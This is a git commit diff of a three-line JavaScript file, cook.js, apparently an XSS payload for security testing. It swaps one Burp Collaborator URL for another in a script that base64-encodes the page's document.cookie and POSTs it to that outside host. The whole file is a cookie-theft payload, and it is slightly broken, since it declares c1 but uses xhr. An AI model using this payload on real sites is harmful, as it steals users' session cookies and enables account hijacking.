401b3355ff1e403595dfd93bbfc430f621f317ce
dbr1t <75198269+dbr1t@users.noreply.github.com>
2020-11-29 11:16:25 +0300

    Update cook.js

--- cook.js
+++ cook.js
@@ -1,3 +1,3 @@
 var c1 = new XMLHttpRequest();
-xhr.open("POST", "https://5iou4di7dedvlg93hajjbecgv71ypn.burpcollaborator.net/cooked" , true);
+xhr.open("POST", "https://0de2gubmnz9rh8sf1qp79shrvi18px.burpcollaborator.net/cook" , true);
 xhr.send(btoa(document.cookie));
